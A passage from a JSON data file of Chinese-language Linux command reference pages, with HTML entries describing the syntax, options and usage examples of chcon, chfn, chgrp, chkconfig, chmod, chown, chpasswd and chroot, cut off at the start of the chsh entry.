        "body": "<h1 id=\"chcon\">chcon</h1>\n<p>修改对象（文件）的安全上下文</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>chcon命令</strong> 是修改对象（文件）的安全上下文，比如：用户、角色、类型、安全级别。也就是将每个文件的安全环境变更至指定环境。使用<code>--reference</code>选项时，把指定文件的安全环境设置为与参考文件相同。chcon命令位于<code>/usr/bin/chcon</code>。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">chcon [选项]... 环境 文件...\nchcon [选项]... [-u 用户] [-r 角色] [-l 范围] [-t 类型] 文件...\nchcon [选项]... --reference=参考文件 文件...\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-h, --no-dereference：影响符号连接而非引用的文件。\n    <span class=\"hljs-attribute\">--reference</span>=参考文件：使用指定参考文件的安全环境，而非指定值。\n-R, --recursive：递归处理所有的文件及子目录。\n-v, --verbose：为处理的所有文件显示诊断信息。\n-u, <span class=\"hljs-attribute\">--user</span>=用户：设置指定用户的目标安全环境。\n-r, <span class=\"hljs-attribute\">--role</span>=角色：设置指定角色的目标安全环境。\n-t, <span class=\"hljs-attribute\">--type</span>=类型：设置指定类型的目标安全环境。\n-l, <span class=\"hljs-attribute\">--range</span>=范围：设置指定范围的目标安全环境。\n</code></pre>\n<p>以下选项是在指定了<code>-R</code>选项时被用于设置如何穿越目录结构体系。如果您指定了多于一个选项，那么只有最后一个会生效。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-H：如果命令行参数是一个通到目录的符号链接，则遍历符号链接。</span>\n<span class=\"hljs-deletion\">-L：遍历每一个遇到的通到目录的符号链接。</span>\n<span class=\"hljs-deletion\">-P：不遍历任何符号链接（默认）。</span>\n<span class=\"hljs-deletion\">--help：显示此帮助信息并退出。</span>\n<span class=\"hljs-deletion\">--version：显示版本信息并退出。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>如果你想把这个ftp共享给匿名用户的话，需要开启以下：</p>\n<pre><code class=\"language-shell\">chcon -R -t public_content_t <span class=\"hljs-regexp\">/var/</span>ftp\n</code></pre>\n<p>如果你想让你设置的FTP目录可以上传文件的话，SELINUX需要设置：</p>\n<pre><code class=\"language-shell\">chcon -t public_content_rw_t <span class=\"hljs-regexp\">/var/</span>ftp/incoming\n</code></pre>\n<p>允许用户HHTP访问其家目录，该设定限仅于用户的家目录主页：</p>\n<pre><code class=\"language-shell\">setsebool -<span class=\"hljs-keyword\">P</span> httpd_enable_homedirs <span class=\"hljs-number\">1</span>\nchcon -<span class=\"hljs-keyword\">R</span> -t httpd_sys_content_t ~user/public_html\n</code></pre>\n<p>如果你希望将samba目录共享给其他用户，你需要设置：</p>\n<pre><code class=\"language-shell\">chcon -t <span class=\"hljs-type\">samba_share_t</span> /directory\n</code></pre>\n<p>共享rsync目录时：</p>\n<pre><code class=\"language-shell\">chcon -t <span class=\"hljs-type\">public_content_t</span> /directories\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "chfn",
        "des": "用来改变finger命令显示的信息",
        "body": "<h1 id=\"chfn\">chfn</h1>\n<p>用来改变finger命令显示的信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>chfn命令</strong> 用来改变finger命令显示的信息。这些信息都存放在/etc目录里的passwd文件里。若不指定任何选项，则chfn命令会进入问答式界面。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">chfn</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-f<span class=\"hljs-attribute\">&lt;真实姓名&gt;</span>或--full-name<span class=\"hljs-attribute\">&lt;真实姓名&gt;</span>：设置真实姓名；\n-h<span class=\"hljs-attribute\">&lt;家中电话&gt;</span>或--home-phone<span class=\"hljs-attribute\">&lt;家中电话&gt;</span>：设置家中的电话号码；\n-o<span class=\"hljs-attribute\">&lt;办公地址&gt;</span>或--office<span class=\"hljs-attribute\">&lt;办公地址&gt;</span>：设置办公室的地址；\n-p<span class=\"hljs-attribute\">&lt;办公电话&gt;</span>或--office-phone<span class=\"hljs-attribute\">&lt;办公电话&gt;</span>：设置办公室的电话号码；\n-u或--help：在线帮助；\n-v或-version：显示版本信息。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户名：指定要改变finger信息的用户名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>范例1，改变finger信息：</p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-symbol\">Desktop</span>]# chfn\n<span class=\"hljs-symbol\">Changing</span> finger information for root.\n<span class=\"hljs-symbol\">Name</span> [root]: jack\n<span class=\"hljs-symbol\">Office</span> []: hn\n<span class=\"hljs-symbol\">Office</span> <span class=\"hljs-symbol\">Phone</span> []: <span class=\"hljs-number\">888888</span>\n<span class=\"hljs-symbol\">Home</span> <span class=\"hljs-symbol\">Phone</span> []: <span class=\"hljs-number\">9999999</span>\n\n<span class=\"hljs-symbol\">Finger</span> information changed.\n</code></pre>\n<p>范例2，改变账号真实姓名：</p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-symbol\">Desktop</span>]# chfn -f jack\n<span class=\"hljs-symbol\">Changing</span> finger information for root.\n<span class=\"hljs-symbol\">Finger</span> information changed.\n</code></pre>\n<p>范例3：</p>\n<pre><code class=\"language-shell\">shell&gt;&gt; chfn\nChanging finger information for user\nPassword: <span class=\"hljs-comment\">[del]</span>\nName<span class=\"hljs-comment\">[]</span>:linuxde ### 提供 finger 时的资料\nOffice<span class=\"hljs-comment\">[]</span>:NCCU\nOffice Phone<span class=\"hljs-comment\">[]</span>: <span class=\"hljs-comment\">[del]</span>\nHome Phone<span class=\"hljs-comment\">[]</span>: <span class=\"hljs-comment\">[del]</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "chgrp",
        "des": "用来变更文件或目录的所属群组",
        "body": "<h1 id=\"chgrp\">chgrp</h1>\n<p>用来变更文件或目录的所属群组</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>chgrp命令</strong> 用来改变文件或目录所属的用户组。该命令用来改变指定文件所属的用户组。其中，组名可以是用户组的id，也可以是用户组的组名。文件名可以 是由空格分开的要改变属组的文件列表，也可以是由通配符描述的文件集合。如果用户不是该文件的文件主或超级用户(root)，则不能改变该文件的组。</p>\n<p>在UNIX系统家族里，文件或目录权限的掌控以拥有者及所属群组来管理。您可以使用chgrp指令去变更文件与目录的所属群组，设置方式采用群组名称或群组识别码皆可。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">chgrp <span class=\"hljs-selector-attr\">[选项]</span><span class=\"hljs-selector-attr\">[组群]</span><span class=\"hljs-selector-attr\">[文件|目录]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-R 递归式地改变指定目录及其下的所有子目录和文件的所属的组</span>\n<span class=\"hljs-deletion\">-c或——changes：效果类似“-v”参数，但仅回报更改的部分；</span>\n<span class=\"hljs-deletion\">-f或--quiet或——silent：不显示错误信息；</span>\n<span class=\"hljs-deletion\">-h或--no-dereference：只对符号连接的文件作修改，而不是该其他任何相关文件；</span>\n<span class=\"hljs-deletion\">-H如果命令行参数是一个通到目录的符号链接，则遍历符号链接</span>\n<span class=\"hljs-deletion\">-R或——recursive：递归处理，将指令目录下的所有文件及子目录一并处理；</span>\n<span class=\"hljs-deletion\">-L遍历每一个遇到的通到目录的符号链接</span>\n<span class=\"hljs-deletion\">-P不遍历任何符号链接（默认）</span>\n<span class=\"hljs-deletion\">-v或——verbose：显示指令执行过程；</span>\n<span class=\"hljs-deletion\">--reference=&lt;参考文件或目录&gt;：把指定文件或目录的所属群组全部设成和参考文件或目录的所属群组相同；</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  组：指定新工作名称；</li>\n<li>  文件：指定要改变所属组的文件列表。多个文件或者目录之间使用空格隔开。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>将<code>/usr/meng</code>及其子目录下的所有文件的用户组改为mengxin</p>\n<pre><code class=\"language-shell\">chgrp -R mengxin <span class=\"hljs-regexp\">/usr/m</span>eng\n</code></pre>\n<p>更改文件ah的组群所有者为 <code>newuser</code></p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@rhel</span> ~]<span class=\"hljs-meta\"># chgrp newuser ah</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "chkconfig",
        "des": "检查或设置系统的各种服务",
        "body": "<h1 id=\"chkconfig\">chkconfig</h1>\n<p>检查或设置系统的各种服务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>chkconfig命令</strong> 检查、设置系统的各种服务。这是Red&nbsp;Hat公司遵循GPL规则所开发的程序，它可查询操作系统在每一个执行等级中会执行哪些系统服务，其中包括各类常驻服务。谨记chkconfig不是立即自动禁止或激活一个服务，它只是简单的改变了符号连接。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">chkconfig</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--add：增加所指定的系统服务，让chkconfig指令得以管理它，并同时在系统启动的叙述文件内增加相关数据；</span>\n<span class=\"hljs-comment\">--del：删除所指定的系统服务，不再由chkconfig指令管理，并同时在系统启动的叙述文件内删除相关数据；</span>\n<span class=\"hljs-comment\">--level&lt;等级代号&gt;：指定读系统服务要在哪一个执行等级中开启或关毕。</span>\n</code></pre>\n<p>缺省的运行级，RHS用到的级别如下：</p>\n<ul>\n<li>0：关机</li>\n<li>1：单用户模式</li>\n<li>2：无网络支持的多用户模式</li>\n<li>3：有网络支持的多用户模式</li>\n<li>4：保留，未使用</li>\n<li>5：有网络支持有X-Window支持的多用户模式</li>\n<li>6：重新引导系统，即重启</li>\n</ul>\n<p>对各个运行级的详细解释：</p>\n<ul>\n<li>0 为停机，机器关闭。</li>\n<li>1 为单用户模式，就像Win9x下的安全模式类似。</li>\n<li>2  为多用户模式，但是没有NFS支持。 </li>\n<li>3  为完整的多用户模式，是标准的运行级。</li>\n<li>4 一般不用，在一些特殊情况下可以用它来做一些事情。例如在笔记本 电脑的电池用尽时，可以切换到这个模式来做一些设置。</li>\n<li>5  就是X11，进到X Window系统了。</li>\n<li>6  为重启，运行init 6机器就会重启。</li>\n</ul>\n<p>需要说明的是，level选项可以指定要查看的运行级而不一定是当前运行级。对于每个运行级，只能有一个启动脚本或者停止脚本。当切换运行级时，init不会重新启动已经启动的服务，也不会再次去停止已经停止的服务。</p>\n<p>运行级文件：</p>\n<p>每个被chkconfig管理的服务需要在对应的init.d下的脚本加上两行或者更多行的注释。第一行告诉chkconfig缺省启动的运行级以及启动和停止的优先级。如果某服务缺省不在任何运行级启动，那么使用<code>-</code>代替运行级。第二行对服务进行描述，可以用<code>\\</code>跨行注释。</p>\n<p>例如random.init包含三行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># chkconfig: 2345 20 80</span>\n<span class=\"hljs-comment\"># description: Saves and restores system entropy pool for \\</span>\n<span class=\"hljs-comment\"># higher quality random number generation.</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">chkconfig</span> --list             #列出所有的系统服务。\n<span class=\"hljs-attribute\">chkconfig</span> --add httpd        #增加httpd服务。\n<span class=\"hljs-attribute\">chkconfig</span> --del httpd        #删除httpd服务。\n<span class=\"hljs-attribute\">chkconfig</span> --level httpd <span class=\"hljs-number\">2345</span> <span class=\"hljs-literal\">on</span>        #设置httpd在运行级别为<span class=\"hljs-number\">2</span>、<span class=\"hljs-number\">3</span>、<span class=\"hljs-number\">4</span>、<span class=\"hljs-number\">5</span>的情况下都是<span class=\"hljs-literal\">on</span>（开启）的状态。\n<span class=\"hljs-attribute\">chkconfig</span> --list               # 列出系统所有的服务启动情况。\n<span class=\"hljs-attribute\">chkconfig</span> --list mysqld        # 列出mysqld服务设置情况。\n<span class=\"hljs-attribute\">chkconfig</span> --level <span class=\"hljs-number\">35</span> mysqld <span class=\"hljs-literal\">on</span> # 设定mysqld在等级<span class=\"hljs-number\">3</span>和<span class=\"hljs-number\">5</span>为开机运行服务，--level <span class=\"hljs-number\">35</span>表示操作只在等级<span class=\"hljs-number\">3</span>和<span class=\"hljs-number\">5</span>执行，<span class=\"hljs-literal\">on</span>表示启动，<span class=\"hljs-literal\">off</span>表示关闭。\n<span class=\"hljs-attribute\">chkconfig</span> mysqld <span class=\"hljs-literal\">on</span>            # 设定mysqld在各等级为<span class=\"hljs-literal\">on</span>，“各等级”包括<span class=\"hljs-number\">2</span>、<span class=\"hljs-number\">3</span>、<span class=\"hljs-number\">4</span>、<span class=\"hljs-number\">5</span>等级。\n\n<span class=\"hljs-attribute\">chkconfig</span> –level redis <span class=\"hljs-number\">2345</span> <span class=\"hljs-literal\">on</span> # 把redis在运行级别为<span class=\"hljs-number\">2</span>、<span class=\"hljs-number\">3</span>、<span class=\"hljs-number\">4</span>、<span class=\"hljs-number\">5</span>的情况下都是<span class=\"hljs-literal\">on</span>（开启）的状态。\n</code></pre>\n<p>如何增加一个服务：</p>\n<ol>\n<li> 服务脚本必须存放在<code>/etc/ini.d/</code>目录下；</li>\n<li> <code>chkconfig --add servicename</code>在chkconfig工具服务列表中增加此服务，此时服务会被在<code>/etc/rc.d/rcN.d</code>中赋予K/S入口了；</li>\n<li> <code>chkconfig --level 35 mysqld on</code>修改服务的默认启动等级。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "chmod",
        "des": "用来变更文件或目录的权限",
        "body": "<h1 id=\"chmod\">chmod</h1>\n<p>用来变更文件或目录的权限</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">chmod [OPTION]<span class=\"hljs-string\">...</span> MODE[,MODE]<span class=\"hljs-string\">...</span> FILE.<span class=\"hljs-string\">..</span>\nchmod [OPTION]<span class=\"hljs-string\">...</span> OCTAL-MODE FILE.<span class=\"hljs-string\">..</span>\nchmod [OPTION]<span class=\"hljs-string\">...</span> <span class=\"hljs-params\">--reference=RFILE</span> FILE.<span class=\"hljs-string\">..</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>通过符号组合的方式更改目标文件或目录的权限。</li>\n<li>通过八进制数的方式更改目标文件或目录的权限。</li>\n<li>通过参考文件的权限来更改目标文件或目录的权限。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>mode：八进制数或符号组合。</p>\n<p>file：指定要更改权限的一到多个文件。</p>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">c</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">changes：当文件的权限更改时输出操作信息。</span>\n--<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">preserve</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">root：不将'/'特殊化处理，默认选项。</span>\n--<span class=\"hljs-comment\">preserve</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">root：不能在根目录下递归操作。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">f</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">silent</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">quiet：抑制多数错误消息的输出。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">v</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">verbose：无论文件是否更改了权限，一律输出操作信息。</span>\n--<span class=\"hljs-comment\">reference=RFILE：使用参考文件或参考目录RFILE的权限来设置目标文件或目录的权限。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">R</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">recursive：对目录以及目录下的文件递归执行更改权限操作。</span>\n--<span class=\"hljs-comment\">help：显示帮助信息并退出。</span>\n--<span class=\"hljs-comment\">version：显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回状态为成功除非给出了非法选项或非法参数。</p>\n<h2 id=\"例子\">例子</h2>\n<blockquote>\n<p>参考<code>man chmod</code>文档的<code>DESCRIPTION</code>段落得知：</p>\n<ul>\n<li><code>u</code>符号代表当前用户。</li>\n<li><code>g</code>符号代表和当前用户在同一个组的用户，以下简称组用户。</li>\n<li><code>o</code>符号代表其他用户。</li>\n<li><code>a</code>符号代表所有用户。</li>\n<li><code>r</code>符号代表读权限以及八进制数<code>4</code>。</li>\n<li><code>w</code>符号代表写权限以及八进制数<code>2</code>。</li>\n<li><code>x</code>符号代表执行权限以及八进制数<code>1</code>。</li>\n<li><code>X</code>符号代表如果目标文件是可执行文件或目录，可给其设置可执行权限。</li>\n<li><code>s</code>符号代表设置权限suid和sgid，使用权限组合<code>u+s</code>设定文件的用户的ID位，<code>g+s</code>设置组用户ID位。</li>\n<li><code>t</code>符号代表只有目录或文件的所有者才可以删除目录下的文件。</li>\n<li><code>+</code>符号代表添加目标用户相应的权限。</li>\n<li><code>-</code>符号代表删除目标用户相应的权限。</li>\n<li><code>=</code>符号代表添加目标用户相应的权限，删除未提到的权限。</li>\n</ul>\n</blockquote>\n<pre><code class=\"language-shell\">linux文件的用户权限说明：\n\n<span class=\"hljs-comment\"># 查看当前目录（包含隐藏文件）的长格式。</span>\nls -la\n  -rw-r--r--   <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">user</span>  <span class=\"hljs-title\">staff</span>   <span class=\"hljs-number\">651</span> Oct <span class=\"hljs-number\">12</span> <span class=\"hljs-number\">12</span>:<span class=\"hljs-number\">53</span> .gitmodules\n\n<span class=\"hljs-comment\"># 第1位如果是d则代表目录，是-则代表普通文件。</span>\n<span class=\"hljs-comment\"># 更多详情请参阅info coreutils 'ls invocation'（ls命令的info文档）的'-l'选项部分。</span>\n<span class=\"hljs-comment\"># 第2到4位代表当前用户的权限。</span>\n<span class=\"hljs-comment\"># 第5到7位代表组用户的权限。</span>\n<span class=\"hljs-comment\"># 第8到10位代表其他用户的权限。</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 添加组用户的写权限。</span>\nchmod g+w ./test.log\n<span class=\"hljs-comment\"># 删除其他用户的所有权限。</span>\nchmod o= ./test.log\n<span class=\"hljs-comment\"># 使得所有用户都没有写权限。</span>\nchmod a-w ./test.log\n<span class=\"hljs-comment\"># 当前用户具有所有权限，组用户有读写权限，其他用户只有读权限。</span>\nchmod <span class=\"hljs-attribute\">u</span>=rwx, <span class=\"hljs-attribute\">g</span>=rw, <span class=\"hljs-attribute\">o</span>=r ./test.log\n<span class=\"hljs-comment\"># 等价的八进制数表示：</span>\nchmod 754 ./test.log\n<span class=\"hljs-comment\"># 将目录以及目录下的文件都设置为所有用户拥有读写权限。</span>\n<span class=\"hljs-comment\"># 注意，使用'-R'选项一定要保留当前用户的执行和读取权限，否则会报错！</span>\nchmod -R <span class=\"hljs-attribute\">a</span>=rw ./testdir/\n<span class=\"hljs-comment\"># 根据其他文件的权限设置文件权限。</span>\nchmod <span class=\"hljs-attribute\">--reference</span>=./1.log  ./test.log\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><p>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man chmod</code>或<code>info coreutils 'chmod invocation'</code>。</p>\n</li>\n<li><p>符号连接的权限无法变更，如果用户对符号连接修改权限，其改变会作用在被连接的原始文件。</p>\n</li>\n<li><p>使用<code>-R</code>选项一定要保留当前用户的执行和读取权限，否则会报错！</p>\n</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "chown",
        "des": "用来变更文件或目录的拥有者或所属群组",
        "body": "<h1 id=\"chown\">chown</h1>\n<p>用来变更文件或目录的拥有者或所属群组</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>chown命令</strong> 改变某个文件或目录的所有者和所属的组，该命令可以向某个用户授权，使该用户变成指定文件的所有者或者改变文件所属的组。用户可以是用户或者是用户D，用户组可以是组名或组id。文件名可以使由空格分开的文件列表，在文件名中可以包含通配符。</p>\n<p>只有文件主和超级用户才可以便用该命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">chown</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-c或——changes：效果类似“-v”参数，但仅回报更改的部分；</span>\n<span class=\"hljs-deletion\">-f或--quite或——silent：不显示错误信息；</span>\n<span class=\"hljs-deletion\">-h或--no-dereference：只对符号连接的文件作修改，而不更改其他任何相关文件；</span>\n<span class=\"hljs-deletion\">-R或——recursive：递归处理，将指定目录下的所有文件及子目录一并处理；</span>\n<span class=\"hljs-deletion\">-v或——version：显示指令执行过程；</span>\n<span class=\"hljs-deletion\">--dereference：效果和“-h”参数相同；</span>\n<span class=\"hljs-deletion\">--help：在线帮助；</span>\n<span class=\"hljs-deletion\">--reference=&lt;参考文件或目录&gt;：把指定文件或目录的拥有者与所属群组全部设成和参考文件或目录的拥有者与所属群组相同；</span>\n<span class=\"hljs-deletion\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户：组：指定所有者和所属工作组。当省略“：组”，仅改变文件所有者；<br>文件：指定要改变所有者和工作组的文件列表。支持多个文件和目标，支持shell通配符。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将目录<code>/usr/meng</code>及其下面的所有文件、子目录的文件主改成 liu：</p>\n<pre><code class=\"language-shell\">chown -R liu <span class=\"hljs-regexp\">/usr/m</span>eng\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "chpasswd",
        "des": "批量更新用户口令的工具",
        "body": "<h1 id=\"chpasswd\">chpasswd</h1>\n<p>批量更新用户口令的工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>chpasswd命令</strong> 是批量更新用户口令的工具，是把一个文件内容重新定向添加到<code>/etc/shadow</code>中。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">chpasswd</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-e：输入的密码是加密后的密文；</span>\n<span class=\"hljs-deletion\">-h：显示帮助信息并退出；</span>\n<span class=\"hljs-deletion\">-m：当被支持的密码未被加密时，使用MD5加密代替DES加密。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>先创建用户密码对应文件，格式为<code>username:password</code>，如<code>abc:abc123</code>，必须以这种格式来书写，并且不能有空行，保存成文本文件user.txt，然后执行chpasswd命令：</p>\n<pre><code class=\"language-shell\">chpasswd &lt; <span class=\"hljs-keyword\">user</span>.txt\n</code></pre>\n<p>以上是运用chpasswd命令来批量修改密码。是linux系统管理中的捷径。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "chroot",
        "des": "把根目录换成指定的目的目录",
        "body": "<h1 id=\"chroot\">chroot</h1>\n<p>把根目录换成指定的目的目录</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>chroot命令</strong> 用来在指定的根目录下运行指令。chroot，即 change root directory （更改 root 目录）。在 linux 系统中，系统默认的目录结构都是以<code>/</code>，即是以根 (root) 开始的。而在使用 chroot 之后，系统的目录结构将以指定的位置作为<code>/</code>位置。</p>\n<p>在经过 chroot 命令之后，系统读取到的目录和文件将不在是旧系统根下的而是新根下（即被指定的新的位置）的目录结构和文件，因此它带来的好处大致有以下3个：</p>\n<p><strong>增加了系统的安全性，限制了用户的权力：</strong> </p>\n<p>在经过 chroot 之后，在新根下将访问不到旧系统的根目录结构和文件，这样就增强了系统的安全性。这个一般是在登录 (login) 前使用 chroot，以此达到用户不能访问一些特定的文件。</p>\n<p><strong>建立一个与原系统隔离的系统目录结构，方便用户的开发：</strong> </p>\n<p>使用 chroot 后，系统读取的是新根下的目录和文件，这是一个与原系统根下文件不相关的目录结构。在这个新的环境中，可以用来测试软件的静态编译以及一些与系统不相关的独立开发。</p>\n<p><strong>切换系统的根目录位置，引导 Linux 系统启动以及急救系统等：</strong> </p>\n<p>chroot 的作用就是切换系统的根位置，而这个作用最为明显的是在系统初始引导磁盘的处理过程中使用，从初始 RAM 磁盘 (initrd) 切换系统的根位置并执行真正的 init。另外，当系统出现一些问题时，我们也可以使用 chroot 来切换到一个临时的系统。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">chroot</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help：在线帮助；</span>\n<span class=\"hljs-comment\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  目录：指定新的根目录；</li>\n<li>  指令：指定要执行的指令。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p><strong>将target作为根目录（运行其中的<code>/bin/sh</code>）:</strong> </p>\n<pre><code class=\"language-shell\">chroot target <span class=\"hljs-regexp\">/bin/</span>sh\n</code></pre>\n<p>这里,target是busybox安装好的路径，类似一个文件系统包含了许多工具。这样，将会进入一个shell界面，这个shell以target为根。运行exit退出该shell又返回原来的本机环境了，也可以使用Ctrl+D。</p>\n<p>注意：</p>\n<ul>\n<li>  根用户才行</li>\n<li>  如果直接chroot target默认寻找target的/bin/bash.这会以target作为根目录</li>\n</ul>\n<p>将target作为根目录(运行其中的<code>/bin/ls</code>):</p>\n<pre><code class=\"language-shell\">chroot target <span class=\"hljs-regexp\">/bin/</span>ls\n</code></pre>\n<p>这里，target是busybox安装好的路径，类似一个文件系统包含了许多工具。这样运行的是target中的ls（不是本机的<code>/bin/ls</code>），然后返回立即本机的目录环境。</p>\n<p>注意，自己在本地编译一个程序生成a.out之后，拷进<code>target/bin/</code>中这样运行却不行,因为它包含了动态连接的库，需要用ldd查看a.out需要那些动态库，将这些库拷贝到新根的对应路径下才能执行。</p>\n<p> <strong>用chroot运行自己编译的一个程序：</strong> </p>\n<p>准备chroot的根目录：</p>\n<pre><code class=\"language-shell\">mkdir newRoot\n</code></pre>\n<p>编译自己的程序：</p>\n<pre><code class=\"language-shell\">gcc <span class=\"hljs-selector-tag\">main</span><span class=\"hljs-selector-class\">.c</span>\n</code></pre>\n<p>这里main.c生成a.out，功能是输出hello。</p>\n<p>查看程序需要的库：</p>\n<pre><code class=\"language-shell\">ldd a.<span class=\"hljs-keyword\">out</span>\n</code></pre>\n<p>输入之后，输出如下：</p>\n<pre><code class=\"language-shell\">linux-gate.so.<span class=\"hljs-number\">1</span> = &amp;gt;  (<span class=\"hljs-number\">0</span>xb8034000)\nlibc.so.<span class=\"hljs-number\">6</span> = &amp;gt; <span class=\"hljs-regexp\">/lib/</span>tls<span class=\"hljs-regexp\">/i686/</span>cmov/libc.so.<span class=\"hljs-number\">6</span> (<span class=\"hljs-number\">0</span>xb7eab000)\n<span class=\"hljs-regexp\">/lib/</span>ld-linux.so.<span class=\"hljs-number\">2</span> (<span class=\"hljs-number\">0</span>xb801a000)\n</code></pre>\n<p>将程序需要的库和程序拷贝到新根目录下：</p>\n<pre><code class=\"language-shell\">cp a.out newRoot\nmkdir newRoot/lib\ncp <span class=\"hljs-regexp\">/lib/</span>tls<span class=\"hljs-regexp\">/i686/</span>cmov<span class=\"hljs-regexp\">/libc.so.6 newRoot/</span>lib\ncp <span class=\"hljs-regexp\">/lib/</span>ld-linux.so.<span class=\"hljs-number\">2</span> newRoot/lib\n</code></pre>\n<p>这里newRoot内容将如下：</p>\n<pre><code class=\"language-shell\">a.<span class=\"hljs-keyword\">out</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">lib</span>/</span>\n</code></pre>\n<p>使用chroot运行自己的程序：</p>\n<pre><code class=\"language-shell\">su\nchroot <span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">Root</span> /a.out\n</code></pre>\n<p>这样就能够正确运行a.out了，因为a.out使用到了其他的动态连接库，所以需要将库拷贝到newRoot中，如果没有其他库那么直接拷贝a.out就能运行。例如静态编译后的busybox，其安装目录中的<code>/bin/busybox</code>就没有依赖其他库。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "chsh",
        "des": "用来更换登录系统时使用的shell",
